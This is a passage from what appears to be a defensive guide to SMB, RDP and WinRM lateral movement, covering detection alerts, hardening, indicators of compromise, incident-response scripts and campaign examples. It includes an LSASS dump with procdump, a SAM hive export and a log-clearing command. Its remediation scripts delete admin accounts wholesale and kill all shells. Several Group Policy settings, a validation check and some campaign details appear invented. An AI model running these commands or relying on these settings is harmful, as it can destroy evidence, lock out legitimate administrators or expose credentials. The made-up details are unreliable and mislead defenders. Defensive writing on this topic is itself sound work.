  2. Review Event ID 7045 (Service Creation) and 4688 (Process Creation) logs
  3. Terminate any suspicious processes
  4. Restore from clean backup if compromise confirmed

**Alert Name:** "Suspicious account creation"
- **Severity:** Critical
- **Description:** Detects when new local administrator accounts are created during lateral movement (common after PsExec execution)
- **Applies To:** Windows Server VMs with Defender enabled
- **Remediation:**
  1. Delete unauthorized accounts: `net user SuspiciousAccount /delete`
  2. Reset passwords for legitimate accounts
  3. Review audit logs for unauthorized access

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Cloud Apps**: ON (for RDP/WinRM anomaly detection)
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts
7. Configure **Alert Rules** → **Custom alert rules** to add additional detections

**Reference:** [Microsoft Defender for Cloud - Alert Reference](https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-reference)

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Block SMB on non-required systems:** Disable SMB shares on workstations that don't require file sharing.
  
  **Applies To Versions:** Server 2016+
  
  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows Defender Firewall** → **Windows Defender Firewall with Advanced Security**
  3. Enable **"Inbound Rules: Block all inbound SMB traffic except from specified sources"**
  4. Configure exceptions for domain controllers and file servers only
  5. Run `gpupdate /force` on all systems
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Disable SMB file sharing (but keep SMB for AD communication)
  Disable-NetAdapterBinding -Name * -ComponentID ms_server
  
  # Or use Windows Firewall to block inbound SMB
  New-NetFirewallRule -DisplayName "Block Inbound SMB" -Direction Inbound -Action Block -Protocol TCP -LocalPort 445
  ```

* **Enforce Network Level Authentication (NLA) for RDP:** Require user authentication before RDP session is established.
  
  **Applies To Versions:** Server 2016+
  
  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Remote Desktop Services** → **Remote Desktop Session Host** → **Security**
  3. Enable **"Require user authentication for remote connections by using Network Level Authentication"**
  4. Set to: **Enabled**
  5. Run `gpupdate /force`
  
  **Manual Steps (Registry):**
  ```powershell
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name SecurityLayer -Value 2
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication -Value 1
  ```

* **Restrict WinRM access to administrative networks only:**
  
  **Applies To Versions:** Server 2016+
  
  **Manual Steps (Windows Firewall):**
  1. Open **Windows Defender Firewall with Advanced Security** (wf.msc)
  2. Click **Inbound Rules** → Find "Windows Remote Management (HTTP-In)" and "Windows Remote Management (HTTPS-In)"
  3. Right-click → **Properties** → **Scope**
  4. Under **Remote IP address**, select **Specific IP addresses** and add only administrative network CIDR blocks (e.g., 10.0.1.0/24)
  5. Click **OK**
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Restrict WinRM to specific IP range
  New-NetFirewallRule -DisplayName "Restrict WinRM to Admin Network" -Direction Inbound `
    -Action Allow -Protocol TCP -LocalPort 5985,5986 -RemoteAddress 10.0.1.0/24
  
  # Remove default "Allow All" rule
  Remove-NetFirewallRule -DisplayName "Windows Remote Management (HTTP-In)" -ErrorAction SilentlyContinue
  ```

#### Priority 2: HIGH

* **Implement Privileged Access Workstation (PAW):** Dedicated systems for administrative access; isolate from general user networks.
  
  **Applies To Versions:** Server 2016+
  
  **Manual Steps:**
  1. Deploy dedicated VM or physical workstation for administrative tasks
  2. Configure network segmentation so PAW cannot reach user endpoints directly
  3. Use RDP or SSH from PAW to access servers (one-way network flow)
  4. Install Windows Defender and enable Real-Time Scanning on PAW
  5. Apply strict GPO: Disable USB drives, removable media, only allow whitelisted executables

* **Enable Multi-Factor Authentication (MFA) for all remote access:**
  
  **Applies To Versions:** Server 2016+ (requires integration with identity provider)
  
  **Manual Steps (For Azure AD/Entra ID joined systems):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Require MFA for RDP/WinRM`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Windows Admin Center**, **Remote Desktop**
  5. **Conditions:**
     - Locations: **Any location** (or exclude corporate network)
  6. **Access controls:**
     - Grant: **Require multi-factor authentication**
  7. Enable policy: **On**
  8. Click **Create**

#### Access Control & Policy Hardening

* **Role-Based Access Control (RBAC) - Limit Administrator Accounts:**
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Roles and administrators**
  2. Search for: **Global Administrator**
  3. Click **Global Administrator** → **Assignments**
  4. For each user, click **Remove assignment** if not essential
  5. Replace with role-based access: **Helpdesk Administrator**, **Security Administrator**, **Exchange Administrator** (as needed)
  
  **For On-Premises Active Directory:**
  ```powershell
  # Find and remove unnecessary Domain Admins
  $admins = Get-ADGroupMember -Identity "Domain Admins"
  foreach ($admin in $admins) {
      if ($admin.Name -ne "Administrator") {  # Keep built-in Admin
          Remove-ADGroupMember -Identity "Domain Admins" -Members $admin.DistinguishedName -Confirm
      }
  }
  ```

* **Conditional Access Policies (Azure/Entra ID):**
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block Lateral Movement - Legacy Auth`
  4. **Assignments:**
     - Users: **All users**
  5. **Conditions:**
     - Legacy auth clients: **Yes** (blocks NTLM, basic auth which enables lateral movement)
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable policy: **On**
  8. Click **Create**

* **Event Log Retention Policy:**
  
  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Event Log**
  3. Configure:
     - **Enforce Audit Log Retention**: **90 days**
     - **Forward events to central repository** (SIEM or Log Analytics Workspace)
  4. Prevent attackers from deleting logs: Set **Full** retention (do not overwrite)
  5. Run `gpupdate /force`

#### Validation Command (Verify Fix)

```powershell
# Check if SMB is properly blocked on workstations
Get-NetFirewallRule -DisplayName "*SMB*" | Select Name, Enabled, Direction, Action

# Verify WinRM is restricted to admin network
Get-NetFirewallRule -DisplayName "*Remote Management*" | Select Name, Enabled, Direction

# Confirm NLA is enforced for RDP
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" | Select SecurityLayer, UserAuthentication

# Check Event Log configuration
Get-EventLog -LogName Security | Measure-Object  # Should show events going back 90+ days
```

**Expected Output (If Secure):**
```
Name                           Enabled Direction Action
----                           ------- --------- ------
Block Inbound SMB                True    Inbound   Block
Restrict WinRM to Admin Network   True    Inbound   Allow

SecurityLayer   : 2 (SSL/TLS)
UserAuthentication : 1 (Required)
```

**What to Look For:**
- Inbound SMB is blocked or highly restricted
- WinRM rules exist only for admin network IPs
- SecurityLayer = 2 (TLS encryption for RDP)
- UserAuthentication = 1 (NLA enforced)

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Files:** 
  - `C:\Windows\System32\drivers\etc\hosts` (modified for DNS spoofing during lateral movement prep)
  - `C:\Temp\PSEXESVC.exe` (PsExec temporary executable)
  - `C:\Windows\Temp\*ABBCDDE*` (SMBExec temporary files)
  - `C:\Windows\System32\config\SAM` (If credential dumping occurred after lateral movement)

* **Registry:** 
  - `HKLM\System\CurrentControlSet\Services\PSEXESVC` (PsExec service)
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\*` (Modified for persistence after lateral movement)
  - `HKLM\System\CurrentControlSet\Control\Lsa\ForceGuest` (Changed to enable guest access)

* **Network:** 
  - Outbound SMB (TCP 445) to multiple internal IPs
  - RDP traffic (TCP 3389) between internal systems
  - WinRM HTTPS (TCP 5986) to multiple destinations
  - DNS queries for multiple internal system names (reconnaissance before lateral movement)

#### Forensic Artifacts

* **Disk:** 
  - `C:\Windows\System32\winevt\Logs\Security.evtx` (Event ID 7045 service creation, Event ID 4624 successful logons)
  - `C:\Windows\Prefetch\PSEXESVC.EXE-*.pf` (Execution of PsExec service)
  - MFT entries showing recently modified service executables

* **Memory:** 
  - LSASS.exe process memory contains cached credentials of authenticated users
  - WMI processes (wmiprvse.exe) may hold handles to remote systems

* **Cloud (Azure/M365):** 
  - Azure Audit Log: "Create or update role assignment" (if attacker modified RBAC)
  - SigninLogs: Multiple logon events from unusual geographic locations or IPs
  - Office 365 Unified Audit Log: "UserLoggedIn" events with unusual logon patterns

* **MFT/USN Journal:** 
  - USN Journal entries showing creation of service binaries in System32
  - MFT entry for event logs being modified or deleted ($STANDARD_INFORMATION timestamp changes)

#### Response Procedures

1. **Isolate:** 
   
   **Command:**
   ```powershell
   # Disable network adapter immediately
   Disable-NetAdapter -Name "Ethernet" -Confirm:$false
   
   # Alternatively, kill WinRM service to stop further lateral movement
   Stop-Service -Name WinRM -Force
   Stop-Service -Name RpcSs -Force  # Disables RPC, but may impact system functionality
   ```
   
   **Manual (Azure):**
   - Go to **Azure Portal** → **Virtual Machines** → Select compromised VM → **Networking**
   - Click on Network Interface → **Network Security Group**
   - Add inbound rule: **Source: 0.0.0.0/0**, **Action: Deny**, **Priority: 100**
   - This cuts network access while preserving VM for forensics

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export Security Event Log to forensic disk
   wevtutil epl Security C:\Evidence\Security.evtx /overwrite:true
   
   # Capture memory dump of LSASS (for credential analysis)
   procdump64.exe -accepteula -ma lsass.exe C:\Evidence\lsass.dmp
   
   # Export Windows Prefetch files
   Copy-Item "C:\Windows\Prefetch\*.pf" "C:\Evidence\Prefetch\"
   
   # Capture registry hives
   reg export HKLM\System C:\Evidence\System.reg
   reg export HKLM\SAM C:\Evidence\SAM.reg
   ```
   
   **Manual:**
   - Open **Event Viewer** → Right-click **Security** → **Save All Events As** → `C:\Evidence\Security.evtx`
   - Open **Task Manager** → **Performance** → **Memory** → Right-click → **Create dump file**
   - Using forensic tools (EnCase, FTK): Capture full disk image for post-incident analysis

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Stop malicious processes
   Stop-Process -Name "cmd" -Force
   Stop-Process -Name "powershell" -Force
   
   # Remove PsExec service if still present
   Remove-Service -Name "PSEXESVC" -ErrorAction SilentlyContinue
   Remove-Item "C:\Windows\System32\PSEXESVC.exe" -Force -ErrorAction SilentlyContinue
   
   # Delete unauthorized local admin accounts created during lateral movement
   $accounts = Get-LocalUser | where { $_.Name -like "*admin*" -and $_.Name -ne "Administrator" }
   foreach ($account in $accounts) {
       Remove-LocalUser -Name $account.Name -Confirm:$false
   }
   
   # Reset password for compromised user accounts
   $password = ConvertTo-SecureString "NewSecurePassword123!" -AsPlainText -Force
   Set-LocalUser -Name "compromised_user" -Password $password
   
   # Clear audit logs to remove evidence (if required by policy - typically NOT recommended)
   Clear-EventLog -LogName Security -Confirm:$false  # Only after SIEM backup
   ```
   
   **Manual:**
   - Open **Services.msc** → Right-click suspicious services → **Delete**
   - Open **Computer Management** → **Local Users and Groups** → Delete unauthorized accounts
   - Open **Event Viewer** → Right-click logs → **Clear Log** (only after forensic collection)

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [CA-PHISH-001] Phishing Email with Macro | Attacker sends malicious Office document; user enables macros and executes payload |
| **2** | **Credential Access** | [CA-DUMP-003] LSASS Dump via MiniDump | Attacker extracts NTLM hashes/Kerberos tickets from LSASS process memory |
| **3** | **Current Step** | **[LM-REMOTE-005]** | **Attacker performs SMB/RDP/WinRM lateral movement using obtained credentials** |
| **4** | **Persistence** | [PERSIST-007] Golden SAML Token | Attacker forges SAML tokens for persistent Azure AD access |
| **5** | **Impact** | [IMPACT-001] Data Exfiltration via Teams | Attacker uploads sensitive data to cloud and exfiltrates via Teams channel |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: Emotet Ransomware Campaign (2021-2022)

- **Target:** Financial services, healthcare, government organizations
- **Timeline:** December 2021 - March 2022
- **Technique Status:** Emotet variant used SMB (T1021.002) and RDP (T1021.001) for lateral movement. Spread through password spraying and credential theft.
- **Attack Chain:** 
  1. Compromised user receives Emotet-laden email
  2. Malware dumps credentials from LSASS
  3. Emotet uses stolen NTLM hashes to spread via SMB shares (\\targets\IPC$)
  4. Lateral movement to file servers and domain controllers
  5. Deployment of Conti ransomware on critical systems
- **Impact:** Organizations paid $500K-$2M+ in ransom; data exfiltration confirmed
- **Reference:** [Emotet Analysis - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/2022/01/20/emotet-botnet-returns), [Emotet Lateral Movement - Sentinel One](https://www.sentinelone.com/blog/emotet-is-back/)

#### Example 2: BlackCat/ALPHV Ransomware (2023-2024)

- **Target:** Critical infrastructure, manufacturing, energy sector
- **Timeline:** June 2023 - November 2024
- **Technique Status:** BlackCat used Impacket's smbexec.py (T1021.002) for lateral movement post-compromise. Operators confirmed using Pass-the-Hash (NTLM) to move between systems.
- **Attack Chain:** 
  1. Initial access via exposed RDP or VPN
  2. Privilege escalation to Local Admin
  3. Credential dumping using Mimikatz
  4. Use of smbexec.py from attacker Linux system to execute commands on internal servers
  5. Deployment of BlackCat ransomware agent via UNC0410 tools (PXSS, DLL injection)
- **Impact:** Organizations lost $4M-$10M+ in operational downtime; multiple government agencies impacted
- **Reference:** [BlackCat/ALPHV Analysis - Mandiant](https://www.mandiant.com/resources/blog/black-cat-ransomware-alphv), [SMBExec Lateral Movement - Malwarebytes](https://www.malwarebytes.com/blog/news/2023/05/blackcat-ransomware)

#### Example 3: APT29 (Cozy Bear) Campaign - SolarWinds Supply Chain Attack (2020)

- **Target:** U.S. government agencies, private sector (Fortune 500)
- **Timeline:** December 2019 - March 2021
- **Technique Status:** APT29 used WMI remote access (Invoke-WmiMethod) and PowerShell Remoting for lateral movement within compromised networks. Leveraged legitimate administrative tools to evade detection.
- **Attack Chain:** 
  1. Compromised SolarWinds Orion platform (software supply chain attack)
  2. Deployed SUNBURST backdoor to thousands of organizations
  3. After gaining initial access, APT29 used valid credentials to move laterally via WinRM (PowerShell Remoting)
  4. Established persistence with persistence mechanisms across domain infrastructure
  5. Exfiltrated sensitive government data (Treasury Department, CISA, State Department emails)
- **Impact:** Estimated 18,000+ organizations affected; U.S. government confirmed breach of multiple agencies; cascading impact to security posture of critical infrastructure
- **Reference:** [SolarWinds Supply Chain Attack - CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/2020/12/13/alert-aa20-352a-potential-compromise-solarwinds-orion-software), [APT29 - MITRE ATT&CK](https://attack.mitre.org/groups/G0016/)

---
